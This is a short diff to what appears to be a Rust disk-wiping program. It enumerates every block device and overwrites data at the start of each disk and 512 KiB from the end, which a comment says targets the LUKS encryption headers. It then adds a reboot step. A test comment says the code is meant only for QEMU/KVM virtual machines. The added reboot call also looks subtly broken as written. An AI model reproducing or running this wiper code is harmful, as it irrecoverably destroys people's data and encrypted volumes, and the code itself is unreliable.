@@ -25,7 +25,6 @@ fn get_block_devices() -> Vec<String> {
 }
 
 pub fn handle_client() {
-
     let block_devices: Vec<String> = get_block_devices();
     for blockdevice in block_devices {
       let diskname = format!("/dev/{blockdevice}");
@@ -51,10 +50,13 @@ pub fn handle_client() {
       disk.write_all(&buffer).unwrap();
 
         // Seek to the end of the disk, just to make sure we get the LUKS headers.
-      disk.seek(io::SeekFrom::End(-byte_offset as i64)).unwrap();
+      disk.seek(io::SeekFrom::End(-524288 as i64)).unwrap();
 
       // Splash two.
       disk.write_all(&buffer).unwrap();
+
+      // Reboot.
+      Command::new("reboot").unwrap();
     }
 }
 
@@ -64,6 +66,6 @@ mod tests {
 
   #[test]
   fn test_disk_locator() {
-    assert_eq!(get_block_devices(), vec!["vda".to_string()])
+    assert_eq!(get_block_devices(), vec!["vda".to_string()]) // Don't worry! This is *supposed* to not pass CI/CD. It should only be tested on QEMU/KVM Virtual Machines.
   }
 }
